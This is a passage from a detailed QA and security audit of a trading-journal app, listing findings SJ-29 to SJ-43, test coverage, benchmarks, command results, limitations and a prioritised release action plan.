  | `loss` | **4.28** (on `raised`) | **4.23** | dark `#f54966`, light `#d91c45` |
  | `profit` | 8.17 | **3.40** | light `#047f59` |
  | `warn` | 7.31 | **2.87** | light `#a85c05` |
  | `fg`, `accent` | ≥ 5.26 | ≥ 5.67 | ok |
- **Impact:** Hints, timestamps and light-theme P&L figures are hard to read, especially in sunlight on a phone.
- **Recommended fix:** Adopt the suggested shades, or similar ones. This is a visual design decision, so it was left to the owner. Re-check large-text uses, where only 3:1 is required.
- **Status:** Confirmed.

### SJ-30: No CI and no lint

- **Severity / category:** Medium, Process
- **Evidence:** No `.github/`, no ESLint config, and Prettier configured but not installed.
- **Impact:** The 212 tests and the E2E journey protect nothing unless someone runs them. React hook dependency mistakes (`react-hooks/exhaustive-deps`) are not caught. None were found by reading, but this was not checked by a tool.
- **Recommended fix:** A GitHub Actions workflow on Windows or Linux running `npm ci`, typecheck, test, build and `build:mobile`. Add `eslint` with `eslint-config-next` (hooks rules).
- **Status:** Confirmed.

### SJ-31: Time-zone suffixes ignored

- **Severity / category:** Low, CSV
- **Reproduction:** Opened `2026-03-02T14:35:00Z`, closed `2026-03-02T15:00:00+02:00`.
- **Actual (observed):** Stored as 14:35 and 15:00 with no warning. The real close (13:00 UTC) was before the open.
- **Note:** By design the journal stores wall-clock times without a zone, so this is a documentation and warning gap, not a calculation bug.
- **Recommended fix:** When values carry a zone, warn in the preview, or convert them to the user's chosen time zone.
- **Status:** Confirmed.

### SJ-32: A newer-version journal on disk is silently downgraded

- **Severity / category:** Low, Persistence
- **Location:** `normalize()` in `src/store/JournalProvider.tsx`
- **Reproduction:** `normalize({ version: 2, futureField: 1, … })`
- **Actual (observed):** `version: 1`, and `futureField` is gone. The next save writes that to disk.
- **Impact:** Only if someone runs an older build against a newer journal, for example by rolling back the desktop folder or sideloading an older APK. Play does not allow downgrades.
- **Recommended fix:** If `version` is greater than the current version, keep a copy and open read-only, or refuse with the same message as SJ-11.
- **Status:** Confirmed.

### SJ-33: Dialogs do not trap Tab

- **Severity / category:** Low, Accessibility
- **Location:** `src/components/ui/Modal.tsx`. There is no Tab handling. `aria-modal="true"` keeps screen readers inside, but keyboard Tab can move to the page behind.
- **Recommended fix:** A small focus trap that cycles Tab and Shift+Tab within the dialog, or the native `<dialog>` element with `showModal()`.
- **Status:** Confirmed by code inspection. Keyboard behaviour was not exercised at runtime.

### SJ-34: Charts have no text alternative

- **Severity / category:** Low, Accessibility
- **Location:** `src/components/dashboard/EquityCurveChart.tsx`, `DailyPnlChart.tsx`, `SniperScoreChart.tsx`. None has an accessible name or role.
- **Mitigation:** The key figures (net, balance, best and worst day) also appear as text in metric cards.
- **Recommended fix:** `role="img"` and an `aria-label` summarising the series, for example "Equity from $10,000 to $10,143 over 3 trades".
- **Status:** Confirmed by code inspection. Not tested with a screen reader.

### SJ-35: "AI Insights" label on rule-based analysis

- **Severity / category:** Low, Product / Store compliance
- **Location:**
  - `src/components/layout/Sidebar.tsx:36`
  - `src/views/InsightsView.tsx:59,83`
  - `src/views/SettingsView.tsx:121`
  - `docs/user-guide.md:104,125`
- **Evidence:** `docs/play-store-listing.md:103-106` deliberately says "insights rather than AI, because the analysis is rule-based calculation". `src/lib/insights.ts` contains only deterministic rules.
- **Impact:** Store screenshots will show "AI". A reviewer could see that as a misleading claim, and it contradicts the listing.
- **Recommended fix:** Rename to "Insights & Signals" in the four places. This is a product wording decision, so it was not changed.
- **Status:** Fixed on 2026-10-09 at the owner's request. Renamed everywhere in the app and the user guide; the brain-circuit icon was replaced with a lightbulb. Store screenshot `assets/play-store/screenshots/05-insights.png` still shows "AI Insights & Signals" and must be retaken before upload.

### SJ-36: Screenshot lifecycle

- **Severity / category:** Low, Persistence
- **Location:** `src/store/JournalProvider.tsx:285-292,319-331,396`
- **Behaviour (code inspection):**
  - Deleting a trade removes its image file at once.
  - Deleting an account, or Erase all data, leaves the account's image files behind.
  - Backups contain the journal JSON only, not the images.
- **Impact:**
  - Orphaned files take up space.
  - A restored backup cannot bring back the chart of a trade that was deleted after the backup was made.
- **Status:** Accepted Risk. Leaving files in place is the recoverable choice. Document it in the user guide.

### SJ-37: Desktop `localStorage` mirror

- **Severity / category:** Informational, Persistence
- **Location:** `src/store/JournalProvider.tsx:20-30,147-160`
- **Behaviour:** On desktop the journal is also mirrored to `localStorage`, and on load the newer of disk and mirror (by `updatedAt`) wins. Above roughly 5 MB (about 10,000 trades; the 10k benchmark journal is 5.36 MB), the browser rejects the mirror write. The error is swallowed by design.
- **Impact:** None while the disk save works. Only if the server cannot write to `data/` *and* the journal is past the limit is the latest change kept nowhere. The status pill does show "browser" in that state.
- **Status:** Accepted Risk.

### SJ-38: npm audit (dev-only)

- **Severity / category:** Informational, Dependencies
- **Evidence:** `npm audit` reports 3 moderate advisories, all via `uuid <11.1.1`, GHSA-w5hq-g745-h8pq, in the chain `@capacitor/cli → xcode → uuid`, which is iOS project tooling. `npm audit --omit=dev` finds 0 vulnerabilities.
- **Note:** `npm audit fix --force` would install `@capacitor/cli@8.4.3`, a downgrade. Nothing from this chain ships in the app.
- **Status:** Accepted Risk. Re-check when Capacitor updates `xcode`.

### SJ-39: A cleaned-up journal is written back only on the next change

- **Severity / category:** Informational, Persistence
- **Evidence:** On Android, a corrupted journal loaded and displayed correctly, but `journal.json` still held the junk entries until the next edit. After a settings change it was clean.
- **Impact:** None in the app, because every load re-cleans it. Anyone inspecting the file by hand sees the old content.
- **Status:** Accepted Risk.

### SJ-40: Two inputs named "Search trades"

- **Severity / category:** Informational, Accessibility
- **Location:** `src/components/layout/GlobalSearch.tsx:59,89` and `src/views/TradesView.tsx:342`
- **Impact:** On the Trades page, a screen-reader user meets two different controls with the same name. The E2E test first typed into the wrong one.
- **Recommended fix:** Name the header one "Search all trades" or "Go to a trade".
- **Status:** Confirmed.

### SJ-41: Real devices and newer WebViews

- **Severity / category:** Informational, Android
- **What was tested:** Only the emulator, with Android 15 and WebView 124.
- **Not verified:**
  - Physical phones.
  - The edge-to-edge layout on WebView ≥ 140, where Capacitor's SystemBars behaviour changes.
  - Different OEM WebViews.
- **Also observed:** The WebView exposes a DevTools socket on the emulator because the image is `userdebug` (`ro.debuggable=1`). Capacitor enables WebView debugging only when the app is debuggable, and the installed release build was not. Behaviour on a production device image was not checked.
- **Recommended fix:** Run Play's pre-launch report, and test on at least one physical phone with a current WebView.
- **Status:** Unverified.

### SJ-42: Performance on phones

- **Severity / category:** Informational, Performance
- **What was measured:** Only desktop timings ([section 11](#11-performance)).
- **Not measured:** A mid-range phone is typically several times slower than the i7 used here, but that was not measured. At 10,000 trades the dashboard computes `computeStats` plus `sniperScore` (about 100 to 125 ms on this PC) whenever its inputs change.
- **Status:** Unverified.

### SJ-43: Journal API has no request-size limit

- **Severity / category:** Informational, Security
- **Location:** `src/app/api/journal/route.desktop.ts`
- **Behaviour:** The PUT and POST handlers call `request.json()` with no size cap. The endpoint only answers loopback requests from the app's own origin.
- **Impact:** A local process could send a huge body, but a local process could equally write the file directly.
- **Status:** Accepted Risk.

---

## 7. Financial findings: definitions now pinned by tests

The tests in `tests/stats.test.ts` use a hand-calculated mixed record, boundary cases, and 400 seeded property runs. The properties are checked against an independent reference implementation written in the test, not against the app's own code.

| Metric | Definition (as implemented and tested) |
|---|---|
| Net P&L | gross − fees. Gross = (exit − entry) × qty × multiplier × direction, or the manual P&L. Settled to 1e-8 (SJ-14). |
| Win / loss / breakeven | net > 0 / net < 0 / net = 0 |
| Win rate | wins ÷ (wins + losses + breakevens). Breakevens are in the denominator. |
| Profit factor | gross wins ÷ \|gross losses\|. `Infinity` with no losses; `null` with neither. |
| Expectancy | mean net per trade |
| R multiple | net ÷ risk, where risk = \|entry − stop\| × qty × multiplier. `null` without a stop. |
| Max drawdown | realised only, trade by trade, from the balance when the range opens (SJ-20). |
| SQN | mean ÷ sample SD × √N over R values when at least 5 and at least half the trades have a stop, otherwise over money (SJ-15). |
| Counted trades | closed, not excluded, and complete. "Open" = not excluded and not closed (SJ-19). |
| Balance | starting balance + realised net of counted trades (SJ-16); plus excluded trades when the owner's setting "Count excluded trades in the balance" is on (off by default). |

Also covered:

- Trades that cross midnight.
- Hold time across a DST change, tested in `America/New_York`.
- Merging scale-ins and scale-outs, including P&L preservation (`tests/merge.test.ts`, 16 tests).
- Ties in time: equal timestamps keep the order in which the trades were logged. This is deterministic, but not explicitly chronological.

---

## 8. CSV findings

**Fixed:** SJ-01, SJ-02, SJ-03, SJ-04, SJ-07, SJ-08, SJ-09, SJ-10, SJ-13.
**Open:** SJ-27, SJ-28, SJ-31.

`tests/csv.test.ts` has 52 tests covering:

- **Parser:** quoting, CRLF line endings, a BOM, semicolon delimiters, embedded newlines.
- **Header aliases.**
- **Numbers:** US and European formats, accounting negatives, currency signs.
- **Dates:** ISO, slash, day-first and month-first, AM/PM, seconds, invalid values.
- **Direction phrasings.**
- **P&L columns:** net vs gross, fees, multiplier derivation.
- **Duplicates by fill id.**
- **Paired buy/sell fills and partial-fill combining.**
- **Export:** a full round trip, formula neutralisation, quoting of `,`, `"` and CR/LF.

---

## 9. Persistence, backup, restore and migrations

**Fixed:** SJ-05, SJ-11, SJ-12. **Open:** SJ-32, SJ-36, SJ-37, SJ-39.

**Verified behaviour.**

*Desktop* (`tests/api-desktop.test.ts`, 19 tests; plus E2E):

- `PUT /api/journal` writes the journal and rolls a daily backup, keeping 30.
- `POST ?copy=before-restore|before-erase` keeps a safety copy, keeping 10. An unknown kind of copy or an invalid payload gets a 400.
- Requests are refused with 403 when they come from another site or a foreign `Host`.
- Screenshot upload limits (type, 8 MB) and name validation are enforced.
- After a server restart, in a browser profile with no `localStorage`, the E2E journey shows the same 3 trades, $143.00 net and balance. They came from `data/journal.json`.

*Android* (`tests/storage-native.test.ts`, 15 tests with an in-memory Filesystem mock; plus on the emulator):

- **Upgrade:** Installing the new build over the old one (`adb install -r`) kept the 78-trade journal.
- **Restore:** It kept `before-restore-*.json` holding the 78 trades it replaced.
- **Restart:** After a force-stop and relaunch, the restored 3 trades were still there.
- **Erase:** It kept `before-erase-*.json` with those 3 trades.
- **Corrupted journal:** The test journal had `null` and junk entries, a duplicate trade id, a duplicate account, a `javascript:` link and an invalid currency. It opened without a crash, showed 78 trades, and was clean after the next save.
- **Afterwards:** The emulator's original test journal was put back.

**Migrations.** There is one schema version (1). `normalize()` fills in defaults for older journals; this is tested. Newer versions are refused on restore (SJ-11) but not yet on load (SJ-32).

---

## 10. Security, privacy, and Windows/Android

### Security and privacy

**Fixed:** SJ-10, SJ-24, SJ-25. **Open:** SJ-38, SJ-43.

**Checked and found sound:**

- **Network exposure.** The desktop server binds `127.0.0.1` only.
- **API guard.** `refuseForeign` rejects a foreign `Host` (DNS rebinding), a foreign `Origin`, and cross-site or same-site `Sec-Fetch-Site`. This was observed with 403s.
- **Screenshot route.** It validates names against a strict pattern, caps size at 8 MB, accepts only allow-listed image types, and serves them with its own `Content-Type`, now with `nosniff`.
- **Sanitizer.** Only `http`/`https` links survive, and setup colours must be plain hex values.
- **Android release build:**
  - No `INTERNET` permission (debug builds add it back for development).
  - `allowBackup="false"`.
  - Data is stored in app-private storage.
- **Mobile export.** It contains no API routes (`out/api` does not exist). The `api/journal` string in one chunk is the bundled desktop adapter, which `pick()` never selects in Capacitor.
- **Privacy.** No telemetry and no outbound requests were found.

**Not done:** No external scanners were used, and no data left the machine. `npm audit` sends only the dependency tree to the npm registry.

### Windows

- All commands were run on Windows 11 in Git Bash and PowerShell 5.1, in a path with Hebrew characters. They passed.
- `start.bat` and `stop.bat` were not exercised in this audit.

### Android

**Built:**

- `npm run build:mobile`, then `npx cap sync android` with no `CAP_LIVE_URL`, then Gradle `assembleDebug` with JDK 21.0.8. All passed.
- No crashes in the logcat crash buffer.

**Verified on the emulator:**

- The back button at each step: a sheet closes → a menu closes → Calendar → Trades → Dashboard → the app exits.
- The restore, erase, persistence and corruption checks above.

**Unverified:** SJ-41.

---

## 11. Performance

`npm run bench` (`tests/bench/workloads.bench.ts`) measures synthetic journals of closed trades with stops, tags, notes and reviews.

**Method:**

- Each workload is warmed up, then run repeatedly for about 0.5 s, and the median is taken.
- The table shows the range over 3 runs on the same machine. The first run was on a quiet machine; the later two ran while the Android emulator was running, which explains most of the spread.
- Times are in milliseconds.

| Trades | Journal JSON | computeStats | sniperScore | buildInsights | CSV import | CSV export | Save (stringify) | Launch (parse + normalize) |
|---|---|---|---|---|---|---|---|---|
| 100 | 0.05 MB | 0.33 to 0.56 | 0.35 to 0.58 | 0.59 to 0.95 | 0.69 to 1.23 | 0.20 to 0.32 | 0.09 to 0.13 | 0.14 to 0.21 |
| 1,000 | 0.54 MB | 3.5 to 5.4 | 3.8 to 5.2 | 5.2 to 8.0 | 7.4 to 12.5 | 2.1 to 3.6 | 1.1 to 1.9 | 1.5 to 2.3 |
| 10,000 | 5.36 MB | 37 to 59 | 39 to 65 | 54 to 82 | 96 to 169 | 25 to 40 | 12 to 20 | 15 to 23 |
| 50,000 | 26.83 MB | 196 to 423 | 210 to 561 | 362 to 531 | 640 to 819 | 156 to 272 | 70 to 104 | 116 to 142 |

**Assessment.** Everything scales roughly linearly. Up to about 10,000 trades every operation stays under about 170 ms on this PC, which is comfortable for a personal journal. At 50,000 trades:

- The dashboard's recalculation is roughly 0.4 to 1 s per change.
- An import of 50,000 rows takes under a second.

Possible optimisations if very large journals ever matter:

- `sniperScore` calls `computeStats` again internally; reusing the existing result would halve the dashboard cost.
- Each save rewrites the whole JSON file. That costs about 100 ms at 27 MB.

No optimisation was made, because nothing measured justifies one yet. Phone timings: SJ-42.

---

## 12. Test coverage and gaps

**Added:** Vitest 5.0.3 and `@vitest/coverage-v8` 5.0.3, both dev-only. Tests run in Node with `TZ=UTC`, and DST tests set their own zone. All data is synthetic (`tests/helpers.ts`), and property tests use a seeded PRNG so they are repeatable.

| Suite | Tests | Scope |
|---|---|---|
| `tests/trade-math.test.ts` | 27 | P&L, fees, R, outcome, hold time across DST and midnight, completeness |
| `tests/stats.test.ts` | 27 | hand-calculated record, boundaries, open count, SQN, 400 property runs vs a reference, days and groups, Sniper Score |
| `tests/merge.test.ts` | 16 | scale-in and scale-out merging, P&L preserved, refusal reasons |
| `tests/csv.test.ts` | 52 | parser, structure, numbers, dates, direction, P&L/fees, multiplier, duplicates/paired fills, export round trip, formula injection |
| `tests/journal-data.test.ts` | 19 | normalize, sanitize rules, multiplier, backup parsing incl. newer versions and 20,000 trades |
| `tests/storage-native.test.ts` | 15 | Capacitor storage on a mock filesystem: atomic save, rolling backups, safety copies, corrupt files, screenshots |
| `tests/api-desktop.test.ts` | 19 | desktop API routes in a temp folder: guard, save, backups, safety copy, screenshots |
| `tests/helpers-format.test.ts` | 32 | number parsing, dates, ranges, sessions, formatting, insights and signals |
| `tests/selectors.test.ts` | 5 | balances and equity-curve consistency |
| **Total** | **212** | |
| `tests/e2e/desktop-journey.mjs` | 37 checks | production desktop build in headless Edge/Chrome over the DevTools protocol, temp data folder, no extra packages |
| `tests/bench/workloads.bench.ts` | n/a | timings (`npm run bench`) |

**Coverage** (`npm run coverage`). This covers `src/lib`, `src/store/sanitize.ts` and `src/app/api` only; components and views are not instrumented.

| | Statements | Branches | Functions | Lines |
|---|---|---|---|---|
| All covered files | **79.34%** (1060/1336) | **73.78%** (864/1171) | 79.53% (237/298) | 80.66% (872/1081) |
| `stats.ts` | 97.53 | 87.2 | 100 | 100 |
| `sanitize.ts` | 98.5 | 97.01 | 100 | 100 |
| `csv.ts` | 92.98 | 91.66 | 93.93 | 93.95 |
| `trade-math.ts` | 91.22 | 81.69 | 94.44 | 92.5 |
| `merge.ts` | 94.18 | 83.95 | 95.12 | 94.82 |
| `storage/capacitor.ts` | 89.36 | 78.78 | 78.57 | 97.46 |
| `api/journal/route.desktop.ts` | 90.14 | 87.5 | 90 | 92.18 |
| `insights.ts` | 66.66 | 47.82 | 58.06 | 68.85 |
| `format.ts` | 64.7 | 67.1 | 46.66 | 64.15 |
| `storage/web.ts` | 2.94 | 0 | 0 | 3.44 (exercised by the E2E journey, which coverage does not measure) |
| `sample.ts`, `screenshots.ts` | ~0 to 4 | | | |

**Gaps:**

- **No component tests** (React Testing Library). UI behaviour is covered only by the one E2E journey.
- **Insights rules are partly covered:** 48% of branches. Each rule's thresholds deserve a test.
- **The E2E journey runs on the desktop only.** The Android flow was checked with the scripts described in [section 9](#9-persistence-backup-restore-and-migrations), which are not in the repository. They depend on adb and a running emulator.
- **No screenshot (image) flow in E2E.**
- **No visual regression tests.**
- **No accessibility scanner** (for example axe) was run. The checks were targeted DOM assertions.

---

## 13. Changes implemented

**Product code:**

- `src/lib/`: `trade-math.ts`, `stats.ts`, `utils.ts`, `csv.ts`, `format.ts`, `backup.ts`
- `src/lib/storage/`: `types.ts`, `index.ts`, `web.ts`, `capacitor.ts`
- `src/app/api/journal/route.desktop.ts`
- `src/store/`: `sanitize.ts`, `JournalProvider.tsx`, and the new `selectors.ts`
- `src/views/`: Dashboard, Calendar, Reports, Settings and Trades views
- `src/components/ui/`: `Field.tsx`, `TagInput.tsx`, `Modal.tsx`
- `next.config.ts`

**Tooling:**

- New `vitest.config.mts`.
- `package.json` scripts: `test`, `coverage`, `bench`, `e2e`.
- Two devDependencies: `vitest` and `@vitest/coverage-v8`.

**Docs:** `README.md` (ground rule 1), `DEVELOPING.md` (commands), and this file.

`git diff --stat`: 26 tracked files changed, +1778 / −146 lines. About 1,240 of the additions are `package-lock.json`. There are also the new `tests/` (about 2,100 lines), `src/store/selectors.ts` and `vitest.config.mts`.

**Compatibility:**

- No public interface was removed, and the journal format is unchanged (still version 1). Old journals and backups load as before; this is tested.
- `JournalStorage` gained one method, `keepCopy`, and both implementations provide it.
- **Behaviour changes a user can notice** (each is a correction, listed with its finding):
  - Excluded trades no longer count toward balances (SJ-16).
  - Some imports now show warnings (SJ-03, SJ-13).
  - Text cells beginning with `=` are prefixed with `'` in exports (SJ-10).
  - SQN values are lower (SJ-15).

---

## 14. Commands and results (final run, after all changes)

Run from a clean `npm ci`, in this order, on the machine above. The same sequence also passed once before the last two fixes (SJ-13, SJ-25).

| Command | Result | Details |
|---|---|---|
| `npm ci` | **PASS** | 227 packages, 33 s; deprecation warning for `uuid@7` (dev chain) |
| `npm run typecheck` | **PASS** | `tsc --noEmit`, no errors |
| `npm test` | **PASS** | 9 files, 212 / 212 tests |
| `npm run coverage` | **PASS** | 212 / 212; statements 79.34%, branches 73.78% |
| `npm run build:mobile` | **PASS** | static export to `out/`, no API routes |
| `npm run build` | **PASS** | desktop server build incl. `/api/journal`, `/api/screenshot` |
| `npm run e2e` | **PASS** | 37 / 37 checks |
| `npm run bench` | **PASS** | timings in [section 11](#11-performance) |
| `npm audit` | **FAIL** (exit 1) | 3 moderate, dev-only (SJ-38) |
| `npm audit --omit=dev` | **PASS** | 0 vulnerabilities |
| lint | **NOT RUN** | no linter configured (SJ-30) |
| Android: `npx cap sync android` + `gradlew assembleDebug` | **PASS** | |
| Android: install over the existing app + restore/erase/persistence/corruption script | **PASS** | 16 / 16 checks, 0 crashes |
| Android: back-button sequence (`adb input keyevent BACK`) | **PASS** | 5 / 5 steps as expected |
| Android: release build / Play bundle | **NOT RUN** in this audit | needs the upload key (`npm run bundle`) |
| Physical device | **BLOCKED** | none available |

---

## 15. Limitations

- **Android:** Emulator only (Android 15, WebView 124). No physical device, no other OEM WebViews, no WebView ≥ 140.
- **Desktop:** The E2E journey used headless Edge at 1440 × 900. Narrow desktop windows, Firefox and Safari were not tested.
- **Accessibility:** No screen reader was used. Accessibility evidence is targeted DOM checks and computed contrast ratios.
- **Security:** This was code review plus targeted requests, not a penetration test. No external scanners were used, by instruction.
- **Coverage:** It covers logic, storage and API code. React components are covered only by the E2E journey.
- **Performance:** Measured on a fast desktop CPU; see SJ-42.
- **Android test scripts:** The emulator scripts are not committed to the repository. They need a local adb setup.
- **Code-inspection findings:** SJ-05, SJ-06, SJ-16 to SJ-18 and SJ-20 to SJ-22 were confirmed by reading the code rather than by a test failing against the old code. The fixes for SJ-05, SJ-06 and SJ-16 to SJ-18 are verified by tests or E2E checks; SJ-20 to SJ-22 only by code review and typecheck.

---

## 16. Release recommendation

**Recommended now: a Play closed or internal test track. Not yet a production rollout.**

**For:**

- The defects that silently corrupted or lost data in the main flows are fixed and pinned by tests: CSV numbers, directions and dates, irreversible restore and erase, and hidden bulk deletes.
- Financial definitions are now pinned by tests.
- The production desktop build passes an end-to-end journey including a restart.
- The Android build survives upgrade, restore, erase, restart and a corrupted journal.

**Against:**

- SJ-27 (double import) and SJ-28 (lost times) can still corrupt statistics for ordinary users.
- SJ-35 ("AI" wording) is a store-review risk.
- SJ-29 (contrast) affects readability.
- Nothing has run on a physical phone (SJ-41).
- Nothing enforces the tests (SJ-30).

A build that compiles is not evidence of readiness. These items are.

---

## 17. Action plan

### P0: before any wider release

| Item | Finding | Effort |
|---|---|---|
| ~~Rename "AI Insights & Signals" to "Insights & Signals"~~ Done 2026-10-09; retake store screenshot 05 | SJ-35 | XS |
| Test on at least one physical phone and read Play's pre-launch report | SJ-41 | S |
| Add CI: `npm ci`, typecheck, test, build, `build:mobile` on every push | SJ-30 | S |

### P1: before production rollout

| Item | Finding | Effort |
|---|---|---|
| Warn about possible duplicate trades on import (fingerprint), skipped by default | SJ-27 | M |
| Join separate Date and Time columns | SJ-28 | S |
| Adopt AA-compliant colour tokens | SJ-29 | S |
| ~~Owner confirms "excluded trades don't count toward balance"~~ Done 2026-10-09: a Settings option, off by default | SJ-16 | XS |
| ESLint with `eslint-config-next` (hook rules) | SJ-30 | S |

### P2: next iterations

| Item | Finding | Effort |
|---|---|---|
| Refuse or read-only a newer-version journal on load | SJ-32 | S |
| Focus trap in `Modal` (or native `<dialog>`) | SJ-33 | S |
| Text alternatives for charts | SJ-34 | S |
| Warn about or convert time-zone suffixes | SJ-31 | S |
| Component tests for TradeForm, ImportTradesModal and Settings | §12 | M |
| Tests for each insights rule | §12 | M |
| Distinct names for the two search inputs | SJ-40 | XS |

### P3: when it matters

| Item | Finding | Effort |
|---|---|---|
| Reuse `computeStats` inside `sniperScore`; measure on a phone | SJ-42 | S |
| Include screenshots in backups, or document that they are excluded; clean up orphaned images | SJ-36 | M |
| Body-size limit on the journal API | SJ-43 | XS |
| Re-check the `@capacitor/cli` advisory when Capacitor updates | SJ-38 | XS |
